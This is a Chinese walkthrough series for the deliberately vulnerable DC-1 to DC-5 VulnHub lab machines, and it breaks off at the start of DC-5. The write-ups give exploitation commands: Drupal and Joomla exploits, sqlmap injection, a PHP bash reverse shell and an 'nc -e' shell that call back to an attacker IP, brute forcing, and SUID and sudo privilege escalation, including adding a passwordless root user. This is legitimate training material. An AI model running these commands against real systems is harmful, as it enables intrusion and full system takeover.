## DC1-通关手册

DC系列的靶机是一个专门构建的易受攻击的实验室，总共有九个！目的是获得渗透测试领域的经验。  
它的设计初学者是一个挑战，但是它的难易程度取决于您的技能和知识以及学习能力。  
要成功完成此挑战，您需要具备Linux技能，熟悉Linux命令行以及具有基本渗透测试工具的经验，例如可以在Kali Linux或Parrot Security OS上找到的工具。  
有多种获得根的方法，但是，我包括了一些标志，这些标志包含了初学者的线索。  
总共有五个Flag，但是最终目标是在root的主目录中找到并读取该标志。您甚至不需要成为root用户即可执行此操作，但是，您将需要root特权。  
根据您的技能水平，您可能可以跳过查找大多数这些标志并直接获得root资格。

## 学习到的知识

`Drupal 7` CMS的`RCE`(Metasploit)

`Drupal 7` 的 `Mysql` 写入 `SQL` 添加后台管理员账号

`find` 命令 `SUID` 权限提升

## 信息搜集

拿到靶机后先对它端口进行扫描：

```text
nmap -A -p- -T4 192.168.1.142
```

  

![](https://pic1.zhimg.com/80/v2-55fe7c37d6de7d38449f2684199b5c94_720w.webp)

  

扫描出来结果发现它开放了 `22`（ssh）、`80`（http）、`111`（nfs共享）。

其中 `http` 的 `web` 使用的 `CMS` 是 `Drupal 7`。我们先从 `web` 下手吧：

```text
http://192.168.1.142
```

  

![](https://pic3.zhimg.com/80/v2-4fc3ed9f430f11717a42ff6c2c9385ca_720w.webp)

  

在 `web` 页面上没有啥东西，尝试了一下弱口令无果，还是先对它进行扫描目录文件吧：

```text
dirb http://192.168.1.142
```

  

![](https://pic4.zhimg.com/80/v2-0d43e7dc5e6e515018bc85b29d899577_720w.webp)

  

扫描出来后发现有 `robots.txt` 文件，打开后是这样的：

  

![](https://pic3.zhimg.com/80/v2-4d10cd0f54ccf7a998641f8579ff0f46_720w.webp)

  

我在翻了一些文件没有得到可利用的信息，只是知道它的版本好像是 `7.x` 版本。随后我搜索了一下有关于这个 CMS 的漏洞，看看能不能捡个漏：

```text
searchsploit Drupal
```

  

![](https://pic3.zhimg.com/80/v2-fd190e85a3ecc9b0357b3c3f0934f4f6_720w.webp)

  

从上图可知，它漏洞还是蛮多的，刚好有一个 `RCE` 可以用 `Metasploit` 来进行利用！随后我打开 MSF 搜索了一下它的利用模块，我使用的是这个模块（前面几个看了不能用）：

```text
exploit/unix/webapp/drupal_drupalgeddon2
```

  

![](https://pic2.zhimg.com/80/v2-e72aa805fbf4a80018ab0db90a3eb72d_720w.webp)

  

之后设置 `rhosts` 开始攻击 `exploit` 得到一枚 `shell`：

看了看只是一个普通的网站权限，系统是 `Linux` 的 `Debian` 。

我先是用 `MSF` 的提权辅助模块来尝试看看能不能运气爆棚的鸡蛋里挑骨头找到一个提权模块：

```text
run post/multi/recon/local_exploit_suggester
```

  

![](https://pic2.zhimg.com/80/v2-d9859b3e732ab2c388951fb3a69d5a25_720w.webp)

  

额，没有找到可以用来提权的模块，那么就算了～我还是先进它 `shell` 里面看看吧，只有打入敌人内部才能取敌将首级！进入到 `shell` 后先用 `python` 来得到一枚 `sh` 吧：

```text
python -c 'import pty;pty.spawn("/bin/sh")
```

  

![](https://pic4.zhimg.com/80/v2-347e1a0e43ff4c027a293082b4f62e53_720w.webp)

  

## Flag1

我所在的目录是网站的绝对路径 `/var/www`，下面有一个 `flag1.txt` 文件，`cat` 查看文件后拿到第一个 `flag`，里面有作者给我们的提示：

```text
Every good CMS needs a config file - and so do you.
```

  

![](https://pic1.zhimg.com/80/v2-508e37f5ef0b9fda27eef158ed20092c_720w.webp)

  

翻译过来大概就是让我们找 `CMS` 的配置文件，这也是我们获取下一个`flag`的线索之一！

## Flag2

得到线索后，我疯狂翻网站的目录找到了它的配置文件：

```text
/var/www/sites/default/settings.php
```

  

![](https://pic4.zhimg.com/80/v2-933fda0b42f16004fa391c8f1a916a57_720w.webp)

  

查看文件后我们得到了`Flag2`，又得到了一个新线索：

```text
<?php

/**
 *
 * flag2
 * Brute force and dictionary attacks aren't the
 * only ways to gain access (and you WILL need access).
 * What can you do with these credentials?
 *
 */

$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);


```

  

![](https://pic2.zhimg.com/80/v2-4ea24c06d88a850ff66f23bccea3081d_720w.webp)

  

翻译过来大概的意思是告诉我们暴力用字典破解不是一个有效的方式，既然得到了配置文件，你能用这个配置文件来做什么？

## Flag3

很明显了，这段提示下面就是一个数据库的配置信息，作者可能是要让我们进入到 `Mysql` 里面！

```text
数据库名：'drupaldb',
用户名：'dbuser',
密码：'R0ck3t',
```

  

![](https://pic1.zhimg.com/80/v2-059cbf6f7d120614c6b3b60a736569b0_720w.webp)

  

成功登陆到它的 Mysql 里面，我找到了一些账号和密码：

  

![](https://pic3.zhimg.com/80/v2-31214adab73383f3f260cff24303fef6_720w.webp)

  

但是这玩意密码有哈希加密了的，我又连续查询了好多表才发现了 `Flag3` 的一丝线索：

  

![](https://pic4.zhimg.com/80/v2-cb1fc79b7b8aaca48527b8e0d272ed43_720w.webp)

  

它这里的 `title` 里有 `flag3`，但是里面没有提示信息！既然是在 `title` 上有 `flag3` 的线索，那么有可能是在网站的里面，也就是网站的后台里！

接着我重新写入了一段 `SQL` 语句，把管理员的密码给重置了：

```text
具体可以看这篇文章：https://www.isfirst.net/drupal/drupal-reset-password

update users set pass='$S$DFLfuzfO9WDKAJcUHnNmhS9NwOD6MRj3pk00qEl4O7iNBD2X4n3v' where name='admin';
# 这段 sql 语句的意思是把 admin 的密码重置为 drupal ，因为它的 pass 加密是 password-hash.sh ，所以我们直接给他替换掉！
```

  

![](https://pic4.zhimg.com/80/v2-9a2572ab8f0eda80286e28808b6d414f_720w.webp)

  

写入成功后，我们来到网站的登陆页面：`http://192.168.1.142/user`

```text
admin：drupal
```

  

![](https://pic1.zhimg.com/80/v2-2efb53ed9fdeb337d1af8815de27b200_720w.webp)

  

登陆进去后我们得到了 `Flag3！` 这个时候我们又得到了一个新线索：

```text
Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
```

大概的意思是让我们通过 `-exec` 命令来得到密码啥的！

## Flag4

既然提示说要我们通过命令来得到密码，那么我首先是查看了 `passwd` 文件，发现了有关 `flag4` 的线索：

  

![](https://pic3.zhimg.com/80/v2-760493ad153adacc8483af940d1e8ade_720w.webp)

  

有一个 `flag4` 的用户，随后我来到了 `flag4` 的目录发现了 `flag4.txt` 文件！（saul文件是我之前玩靶机留下的，大家当作没有就好了）

打开之后呢得到了最后一个线索：

```text
Can you use this same method to find or access the flag in root?
Probably. But perhaps it's not that easy.  Or maybe it is?
```

  

![](https://pic1.zhimg.com/80/v2-f2cac4abd11da382b64659c77980c164_720w.webp)

  

翻译过来的意思大概是让我们以相同的方式来得到 `root` 目录下的 `flag` 。

## Flag5

得到线索后我习惯性的 `sudo -l` 查看有没有什么命令可以让我提权的，但是它没有 `sudo` 这个命令：

  

![](https://pic4.zhimg.com/80/v2-b219a5571be0a8aff9fbc74f5538baeb_720w.webp)

  

额，有点打脑壳！借用`朝阳冬泳怪鸽`的话：我们遇到什么困难也不要怕，微笑着面对它！消除恐惧的最好办法就是面对恐惧！坚持，才是胜利。加油！奥利给！

别慌，抽根烟再好好想想！我又接着查看下，看它有没有 `root` 权限的文件，但是没有：

```text
find / -perm -4000 2>/dev/null
```

  

![](https://pic4.zhimg.com/80/v2-78cc07e2b646dd8ca242cfd7379f91f3_720w.webp)

  

接着我又查看了有没有 `root` 权限的 `SUID` 命令发现了这些：

```text
find / -type f -perm -u=s 2>/dev/null
```

  

![](https://pic4.zhimg.com/80/v2-01820d9ab243c3e630524646df65b523_720w.webp)

  

其中有一个命令我之前提权的时候用过，就是 `find` 命令！刚好之前在拿到 `Flag3` 的时候它提示了 `-exec` 命令！这是一个参数，搭配 `find` 查找命令使用可以调用命令来去执行！

我首先是想在 `flag4` 目录创建个文件，但是失败了！但是没关系！

  

![](https://pic1.zhimg.com/80/v2-548776d12342dca1c8a4f8ac6f458ab8_720w.webp)

  

由于当前目录下有一个 `flag4.txt` 文件我们就直接使用 `find` 查看当前权限，请忽略上面那条命令！（当时的思路是创建一个文件，然后使用 find 命令来查找这个文件然后执行命令的）

```text
find flag4.txt -exec "whoami" \;
```

  

![](https://pic1.zhimg.com/80/v2-c350b65409a0222913907a64c788da30_720w.webp)

  

可以看到，我们的权限是 `root` 了，我们直接提权把：

```text
find flag4.txt -exec "/bin/sh" \;
# 这段命令的意思就是先使用 find 命令查找 flag4.txt 文件，然后使用它的参数 -exec 来执行命令 /bin/sh ，这样我们就能获取到 root 权限了！
```

  

![](https://pic3.zhimg.com/80/v2-d46ec030567d5d16580d7e4cdc58aaca_720w.webp)

  

最后也是在 `root` 目录下拿到了最后的 `Flag` 文件！

## DC2-通关手册

Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.  
As with the original DC-1, it's designed with beginners in mind.  
Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.  
Just like with DC-1, there are five flags including the final flag.  
And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.  
In short, the only flag that really counts, is the final flag.  
For beginners, Google is your friend. Well, apart from all the privacy concerns etc etc.  
I haven't explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install.  
靶机地址：[https://www.vulnhub.com/entry/dc-2,311/](https://link.zhihu.com/?target=https%3A//www.sec-in.com/outLinkPage/%3Ftarget%3Dhttps%3A//www.vulnhub.com/entry/dc-2%2C311/)  
这个靶机和`DC-1`是一个系列的，总共有`5`个Flag，最后一个Flag是在 `root` 目录下！

## 信息搜集

拿到靶机 `IP` 后对它一顿梭哈：

```text
nmap -A -p- -T4 192.168.1.143
```

  

![](https://pic2.zhimg.com/80/v2-414a4d99bf9f3b95cc87e04ed32ee7bd_720w.webp)

  

扫描出来后发现它开放了 `80`（http）和 `7744`（ssh）服务，我们先从 `80` 开始，先对它进行目录扫描看看它有那些目录文件：

```text
dirb http://192.168.1.143
```

  

![](https://pic4.zhimg.com/80/v2-28568268f0cbf5d4bd4d0c15d4cb2857_720w.webp)

  

## Flag1

访问 `http://192.168.1.143` 发现它重定向到了这个 URL：`http://dc-2/`

  

![](https://pic2.zhimg.com/80/v2-7c007d496d2750b14a61add469d96491_720w.webp)

  

这个时候我们设置一下 `hosts` 就可以了：

```text
vi /etc/hosts
```

  

![](https://pic1.zhimg.com/80/v2-76b980706ec18e6b3d3e8019e8c2eafc_720w.webp)

  

设置好后再重新访问 `web` 就是正常的页面：

  

![](https://pic2.zhimg.com/80/v2-f3c66fe4b10bfd8e9edda381b1da3091_720w.webp)

  

从页面上来看网站使用的 `CMS` 是 `Wordpress`，这个时候我在页面上找到了第一个 `Flag`：

```text
Flag 1:

Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.

More passwords is always better, but sometimes you just can’t win them all.

Log in as one to see the next flag.

If you can’t find it, log in as another.
```

  

![](https://pic3.zhimg.com/80/v2-c44dd0fa607494643ca268c4da55f9f2_720w.webp)

  

翻译过来的意思就是让我们用 `cewl` 来生成一个字典，字典越大越好，然后用一个身份登陆进网站后台我们会得到下一个提示！

## Flag2

既然提示是让我们登陆一个用户到后台，那么我就先来探测一下网站的用户有哪些：

```text
wpscan --url http://dc-2 -e u
```

  

![](https://pic4.zhimg.com/80/v2-3d204fadae56c60186eadcf998891c9f_720w.webp)

  

由上图可知，`wpscan` 探测出来用户由三个：`admin`、`jerry`、`tom`！

随后我用第一个`Flag`的提示，用 KALI 自带的 `cewl` 来对网站页面进行搜集来生成一个字典：

```text
cewl http://dc-2 -w pass
```

  

![](https://pic2.zhimg.com/80/v2-10dbece7bafc18e278877384ece25861_720w.webp)

  

然后我吧刚刚 `wpscan` 探测出来的用户名保存到 user 文件里：

  

![](https://pic4.zhimg.com/80/v2-839b55f8fef2edbe6810dc996136cdeb_720w.webp)

  

一切就绪之后用 `wpscan` 来对用户进行爆破枚举：

```text
wpscan --url http://dc-2 -U user -P pass
```

  

![](https://pic3.zhimg.com/80/v2-92cc2cb23c104458613bb43ecb6701ca_720w.webp)

  

爆破枚举后得到了他们的密码：

```text
Username: jerry, Password: adipiscing
 Username: tom, Password: parturient
```

随后用得到的用户密码登陆到后台获取到了`Flag2`:

```text
Flag 2:

If you can't exploit WordPress and take a shortcut, there is another way.

Hope you found another entry point.
```

  

![](https://pic4.zhimg.com/80/v2-66011bea446f9583e3e5c3ed57f409bf_720w.webp)

  

翻译过来的意思是：我们不能以 `Wordpress` 作为捷径，你需要找到另一种方法！

## Flag3

我这人偏偏不信邪！我在后台尝试看看能不能获取到一枚 `webshell`，但是，但是我失败了！

好吧，我刘某人听你一次！！！

既然它提示不能从 `Web` 下手，那么它只开放了一个 `7744`（ssh）服务，估计就是想让我们登陆到它到 `ssh`！恰好我们刚才枚举出来了两个用户密码，随后我尝试用得到到账号和密码来登陆 `ssh`：

```text
ssh tom@192.168.1.143 -p 7744
```

  

![](https://pic1.zhimg.com/80/v2-9ded95c295aa7271d5853e89d3b8a300_720w.webp)

  

成功登陆到 `tom` 用户！登陆之后我发现我执行不了一些命令：

  

![](https://pic4.zhimg.com/80/v2-af9d5bc0dca436dfaccab4f0639dec13_720w.webp)

  

这个时候因为我们的shell是`rbash`，所以 `shell` 被限制了！随后我看了看当前的环境变量：

  

![](https://pic4.zhimg.com/80/v2-74f478466ad1ac437f55139de49e7cdb_720w.webp)

  

查看了环境变量，发现被写到了 `/home/tom/usr/bin` 下面！由于我们的 `shell` 被限制了，所以导致我们不能执行一些命令！

我先是 `vi` 来转义一下受限制的 `shell`：

```text
vi
:set shell=/bin/bash
:shell
```

  

![](https://pic4.zhimg.com/80/v2-4c717e9f290fb68d3b6f40e9676c24eb_720w.webp)

  

  

![](https://pic1.zhimg.com/80/v2-87cc47115d66ed8bb2415b27eeef8378_720w.webp)

  

然后再设置一下环境变量：

```text
export PATH=/bin:/usr/bin:$PATH
export SHELL=/bin/bash:$SHELL
```

  

![](https://pic4.zhimg.com/80/v2-ab90cd47d2d570768792806ba55cc4bb_720w.webp)

  

这个时候就能执行命令了！然后查看了一下 `flag3.txt` 文件找到了新的线索：

```text
Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
```

翻译过来的意思就是：可怜的老汤姆总是在追求杰瑞。也许他应该为他所造成的压力而道歉。

## Flag4

随后我切换用户到 `jerry`：

```text
su jerry
```

  

![](https://pic4.zhimg.com/80/v2-bfdef44686a6781c4c6ac7062a7c6f87_720w.webp)

  

登陆到 `jerry` 用户之后，拿到了 `Flag4` ！随后又得到了一个提示：

```text
Good to see that you've made it this far - but you're not home yet. 

You still need to get the final flag (the only flag that really counts!!!).  

No hints here - you're on your own now.  :-)

Go on - git outta here!!!!
```

翻译过来到意思大概就是恭喜我们走到这一步，最后一步就是拿到 `root` 权限到意思！

## Flag5

只剩下随后一个 `flag` 了，我们只需要提升权限为 `root` 就可以了。

我习惯性的 `sudo -l` 发现 `jerry` 可以以 `root` 身份去执行 `git` 命令：

  

![](https://pic3.zhimg.com/80/v2-7d1fbbfa175114137a58dc87618c26c2_720w.webp)

  

那么很简单了，我找到了几个 `poc` ：

  

![](https://pic3.zhimg.com/80/v2-470e4bca0da633bcbb1bd7c5d1bb3a3e_720w.webp)

  

随便使用了一个成功提权为 `root`：

  

![](https://pic3.zhimg.com/80/v2-4bfdea3798b17d24e3973c2815bbe43a_720w.webp)

  

最后也是在 `/root` 目录下拿到了 `Flag`！

## DC3-通关手册

大家好，我是 `saulGoodman`，这篇文章是DC系列第三篇Walkthrough，总共有8篇，敬请期待！  
下载地址：[https://www.vulnhub.com/entry/dc-3,312/](https://link.zhihu.com/?target=https%3A//www.sec-in.com/outLinkPage/%3Ftarget%3Dhttps%3A//www.vulnhub.com/entry/dc-3%2C312/)  
这次靶机只有一个 `Flag`，也就是在 `/root` 目录下的！所以我们要提升为 `root` 权限！

## 信息搜集

拿到靶机后的第一件事就是对它进行端口扫描：

```text
nmap -A -p- -T4 192.168.1.103
```

  

![](https://pic3.zhimg.com/80/v2-f06a10e50c992edb281358571456a1da_720w.webp)

  

这边用 `NMAP` 扫描出来后发现它只开放了一个 `80` 端口，而且使用的 `CMS` 是 `Joomla`，这个 `CMS` 我之前完红日靶场遇到过一次。

既然 `CMS` 是 `Joomla` 那么就使用它的扫描工具对它一顿梭哈吧：

```text
perl joomscan.pl -u http://192.168.1.103
```

  

![](https://pic2.zhimg.com/80/v2-78d0a1d78e56029a69f6fc32248c2c09_720w.webp)

  

扫描出来后我们得到了两个关键信息，也就是它的版本和它的网站后台地址：

```text
版本：Joomla 3.7.0
后台地址 : http://192.168.1.103/administrator/
```

先访问它的首页发现了一段提示信息：

```text
Welcome to DC-3.

This time, there is only one flag, one entry point and no clues.

To get the flag, you'll obviously have to gain root privileges.

How you get to be root is up to you - and, obviously, the system.

Good luck - and I hope you enjoy this little challenge.  :-)
```

  

![](https://pic2.zhimg.com/80/v2-e7dca4cc17e828640954068ca7ac61c1_720w.webp)

  

大概的意思就是说这个靶场只有一个Flag，要让我们取得 root 权限！

## Joomla SQL 注入

既然是这样那么我首先是搜索了有关于 `Joomla 3.7.0` 的漏洞信息，看看能不能捡个漏

```text
searchsploit Joomla 3.7.0
```

  

![](https://pic1.zhimg.com/80/v2-30270930de4df3a4616ff1b65986c1e8_720w.webp)

  

由上图可见，它这个版本有一个 `SQL` 注入！既然有注入那么就丢到 `Sqlmap` 一把梭：

```text
sqlmap -u "http://192.168.1.103/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

  

![](https://pic4.zhimg.com/80/v2-98727d74154d0a9eee6c1238b247c457_720w.webp)

  

这边是注入出来了`五`个数据库，但是 `Joomla CMS` 默认的数据库为 `joomladb`，所以我们就直接跑这个数据库下的表把：

```text
sqlmap -u "http://192.168.1.103/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables
[01:08:45] [INFO] fetching tables for database: 'joomladb'
[01:08:45] [INFO] used SQL query returns 91 entries
Database: joomladb
[76 tables]
+---------------------+
| #__assets           |
| #__associations     |
| #__banner_clients   |
| #__banner_tracks    |
| #__banners          |
| #__bsms_admin       |
| #__bsms_books       |
| #__bsms_comments    |
| #__bsms_locations   |
| #__bsms_mediafiles  |
| #__bsms_message_typ |
| #__bsms_podcast     |
| #__bsms_series      |
| #__bsms_servers     |
| #__bsms_studies     |
| #__bsms_studytopics |
| #__bsms_teachers    |
| #__bsms_templatecod |
| #__bsms_templates   |
| #__bsms_timeset     |
| #__bsms_topics      |
| #__bsms_update      |
| #__categories       |
| #__contact_details  |
| #__content_frontpag |
| #__content_rating   |
| #__content_types    |
| #__content          |
| #__contentitem_tag_ |
| #__core_log_searche |
| #__extensions       |
| #__fields_categorie |
| #__fields_groups    |
| #__fields_values    |
| #__fields           |
| #__finder_filters   |
| #__finder_links_ter |
| #__finder_links     |
| #__finder_taxonomy_ |
| #__finder_taxonomy  |
| #__finder_terms_com |
| #__finder_terms     |
| #__finder_tokens_ag |
| #__finder_tokens    |
| #__finder_types     |
| #__jbsbackup_timese |
| #__jbspodcast_times |
| #__languages        |
| #__menu_types       |
| #__menu             |
| #__messages_cfg     |
| #__messages         |
| #__modules_menu     |
| #__modules          |
| #__newsfeeds        |
| #__overrider        |
| #__postinstall_mess |
| #__redirect_links   |
| #__schemas          |
| #__session          |
| #__tags             |
| #__template_styles  |
| #__ucm_base         |
| #__ucm_content      |
| #__ucm_history      |
| #__update_sites_ext |
| #__update_sites     |
| #__updates          |
| #__user_keys        |
| #__user_notes       |
| #__user_profiles    |
| #__user_usergroup_m |
| #__usergroups       |
| #__users            |
| #__utf8_conversion  |
| #__viewlevels       |
+---------------------+
```

跑出来的表有 `91` 条！但是我们只需要它后台管理员的用户那个表就好，接着我找到了一个为`#__users`的表，随后我开始注入它的列：

```text
sqlmap -u "http://192.168.1.103/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T "#__users" --columns
Database: joomladb
Table: #__users
[6 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| email    | non-numeric |
| id       | numeric     |
| name     | non-numeric |
| params   | non-numeric |
| password | non-numeric |
| username | non-numeric |
+----------+-------------+
```

最后注入出它的 `username` 和 `password` 列的数据：

```text
sqlmap -u "http://192.168.1.103/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T "#__users" -C username,password --dump 
```

  

![](https://pic4.zhimg.com/80/v2-3c239d846f8ff2dd395640a6c851178f_720w.webp)

  

注入出来后得到了账号和一段加密的`hash`：

```text
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |
+----------+--------------------------------------------------------------+
```

一般来说这种加密需要用字典来撞，运气好就能得到它的明文！我是使用 `KALI` 自带的 `john` 来破解它的 `hash`：

  

![](https://pic3.zhimg.com/80/v2-17c174e3c3af15721d945c0aa8019ae2_720w.webp)

  

因为我之前使用 `john` 破解过 `pass` 的 `hash`了，`john` 只会对同一个文件破解一次，所以我直接查看了上一次的爆破结果密码为：`snoopy`！

## Joomla Getshell

拿到密码后我登陆到了网站到后台：

```text
http://192.168.1.103/administrator/index.php
```

  

![](https://pic3.zhimg.com/80/v2-c5649d185cc36219cf4fcecbdf56a33a_720w.webp)

  

登陆到后台我来到了网站到模版处，添加了一个新的`php`页面，里面的代码是我们的反弹`shell`的代码：

```text
<?php
system("bash -c 'bash -i >& /dev/tcp/192.168.1.128/4444 0>&1' ");
?>
```

  

![](https://pic4.zhimg.com/80/v2-9ce5d5b8f4ad27fbb4271687fb1b04bb_720w.webp)

  

这个时候 `KALI` 用 `nc` 监听 `4444`，我们访问 `saul.php` 这个文件成功得到一枚`shell`：

```text
192.168.1.103/templates/beez3/saul.php
```

  

![](https://pic1.zhimg.com/80/v2-e9e513826e8337b1b57055b676b5ba0c_720w.webp)

  

## 权限提升

拿到`shell`只后我查看了一下内核版本发现系统是16年的 `Ubuntu`：

```text
uname -a
```

  

![](https://pic3.zhimg.com/80/v2-2f686c4cb1087f0322e763f081c574be_720w.webp)

  

紧接着我搜索有关于这个版本的漏洞发现了一个提权漏洞：

  

![](https://pic3.zhimg.com/80/v2-bf59e82862edb266b2f28331cfd9e456_720w.webp)

  

这是它的下载地址：

```text
https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
```

我把 `exp` 下载到本地只后，我 `KALI` 先是用 `python` 开启了一个简单的服务器用于靶机下载我们的 `exp`：

```text
python -m SimpleHTTPServer 8888
```

  

![](https://pic3.zhimg.com/80/v2-3a1a691b90ff05162cdbcd0cc702511a_720w.webp)

  

随后靶机用 `wget` 把我们的 `exp` 下载到靶机上：

  

![](https://pic1.zhimg.com/80/v2-0fbf64939205a2e845e363f8246d2c24_720w.webp)

  

紧接着解压文件后，运行 `doubleput` 提权为 `root`：

  

![](https://pic2.zhimg.com/80/v2-bfee3a6159db38b2de4adeffd4462c79_720w.webp)

  

最后也是在 `root` 目录下拿到了 `Flag`！

## DC4-通关手册

DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.

Unlike the previous DC releases, this one is designed primarily for beginners/intermediates. There is only one flag, but technically, multiple entry points and just like last time, no clues

靶机地址：[https://www.vulnhub.com/entry/dc-4,313/](https://link.zhihu.com/?target=https%3A//www.sec-in.com/outLinkPage/%3Ftarget%3Dhttps%3A//www.vulnhub.com/entry/dc-4%2C313/)

这边靶机和前一个是一样的，只需要获取一个`Flag`就行了，在 `/root` 目录下!

## 学习到的知识

`Burpsuite`枚举弱口令  
`命令执行`反弹shell  
`hydra`爆破`ssh`  
`teehee`权限提升

## 信息搜集

拿到 `IP` 先对它进行端口扫描：

```text
nmap -A -T4 192.168.1.100
```

  

![](https://pic4.zhimg.com/80/v2-88208bf9b050d57ab2cdec1560e82357_720w.webp)

  

这边扫描出来靶机开放了 `22`（ssh）、`80`（http）端口，先从 `80` 端口来入侵：

```text
http://192.168.1.100/
```

  

![](https://pic2.zhimg.com/80/v2-aa73101cf21b5848465db74c846e1c81_720w.webp)

  

## Burpsuite枚举弱口令

打开后发现是一个登陆的页面，我尝试了常规的弱口令 `admin`、`admin123` 无果，随后我又尝试了一遍 `SQL` 注入，并没有注入点！这个时候就需要掏出我的字典来了来配合 `Burp` 爆破：

```text
POST /login.php HTTP/1.1
Host: 192.168.1.100
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.100/
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Connection: close
Cookie: PHPSESSID=lddqa4ven9a9qqf8ua9tlurj35
Upgrade-Insecure-Requests: 1

username=admin&password=§123456§
```

  

![](https://pic1.zhimg.com/80/v2-662b838791ab4e8cb2bd9355ec43ab44_720w.webp)

  

  

![](https://pic1.zhimg.com/80/v2-1a346fe66545f6b8a62c7c0e3c756854_720w.webp)

  

爆破成功后得到密码 `happy`，随后拿着账号和密码登陆到了后台，在后台发现可以执行查看文件的操作：

  

![](https://pic3.zhimg.com/80/v2-73a238118481cd1e14f9e042b1743fbe_720w.webp)

  

## 命令执行反弹shell

这个时候想到了`命令执行`，`whoami` 看了看权限是一个网站普通权限：

  

![](https://pic1.zhimg.com/80/v2-892abd11e93b52e666b41cbb635417cc_720w.webp)

  

我们先用 `nc` 反弹一个 `shell` 回来把，`kali` 监听 `4444` 端口，在 `radio` 变量输入 `nc` 反弹的地址成功反弹一枚shell：

```text
nc -e /bin/sh 192.168.1.128 4444
```

  

![](https://pic3.zhimg.com/80/v2-d8304ab301fcf03b2be853d2a262df22_720w.webp)

  

我们先让它得到一个 `bash` 把：

```text
python -c 'import pty;pty.spawn("/bin/bash")'
```

## hydra爆破ssh

之后我是在 `/home/jim` 目录里发现了一个`历史密码`的`备份文件`：

  

![](https://pic1.zhimg.com/80/v2-7e7dc376cdba990dc7896350641de0f8_720w.webp)

  

既然得到了密码，那么就用`九头蛇`来爆破把：

```text
hydra -l jim -P pass ssh://192.168.1.100 -t 10
```

  

![](https://pic2.zhimg.com/80/v2-408c079a43deba78f2ade6747b7272f9_720w.webp)

  

爆破成功后得到 `jim` 的密码为 `jibril04`，随后我登陆到了 `jim` 用户：

```text
ssh jim@192.168.1.100
```

  

![](https://pic1.zhimg.com/80/v2-997aad3579b9d5efc5ac808215924d58_720w.webp)

  

登陆之后我习惯性的 `sudo -l` 发现需要密码：

  

![](https://pic4.zhimg.com/80/v2-969790745463ca2c066f61ae7833b1cf_720w.webp)

  

紧接着我在 `jim` 的目录下发现了一个文件，文件里好像是一封邮件信息：

```text
From root@dc-4 Sat Apr 06 20:20:04 2019
Return-path: <root@dc-4>
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000
Received: from root by dc-4 with local (Exim 4.89)
        (envelope-from <root@dc-4>)
        id 1hCiQe-0000gc-EC
        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000
To: jim@dc-4
Subject: Test
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCiQe-0000gc-EC@dc-4>
From: root <root@dc-4>
Date: Sat, 06 Apr 2019 20:20:04 +1000
Status: RO

This is a test.
```

  

![](https://pic4.zhimg.com/80/v2-414b6f66b2b8a15f36b0804bb9b931c3_720w.webp)

  

好像没得啥子用处！最后我在邮箱目录找到了另一封邮件：

  

![](https://pic3.zhimg.com/80/v2-cb062253578aba71d9a58ca17b2a4966_720w.webp)

  

读完这封邮件我得到了 `charles` 告诉 `jim` 的一个重要信息，也就是 `charles` 的密码！

```text
charles：^xHhA&hvim0y
```

获取到密码后我切换到了 `charles` 用户：

```text
su charles
^xHhA&hvim0y
```

  

![](https://pic1.zhimg.com/80/v2-f3d83a992c0638a6b2fa55e01847ebd4_720w.webp)

  

## teehee权限提升

切换用户之后我又是习惯性的 `sudo -l` 发现 `charles` 用户可以以 `root` 身份去运行 `teehee`命令：

  

![](https://pic3.zhimg.com/80/v2-71e0273f937d2532d57ee46373a4fd2e_720w.webp)

  

我紧接着写入了一个 `saul` 账号到 `passwd` 里：

```text
echo "saul::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
#注释：
#[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]
```

  

![](https://pic1.zhimg.com/80/v2-fc50c635ace6557573cbcee6c08a97f0_720w.webp)

  

最后也是在 `/root` 目录下拿到了 `Flag` ～

## DC5-通关手册

DC-5 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.

The plan was for DC-5 to kick it up a notch, so this might not be great for beginners, but should be ok for people with intermediate or better experience. Time will tell (as will feedback).

靶机地址：[https://www.vulnhub.com/entry/dc-5,314/](https://link.zhihu.com/?target=https%3A//www.sec-in.com/outLinkPage/%3Ftarget%3Dhttps%3A//www.vulnhub.com/entry/dc-5%2C314/)

## 学习到的知识

`LFI`(本地文件包含)日志获取shell  
`wfuzz`工具的使用  
`screen`提权root

## 信息搜集

拿到 `IP` 先扫描端口开放服务：

```text
nmap -A -T 4 192.168.1.144
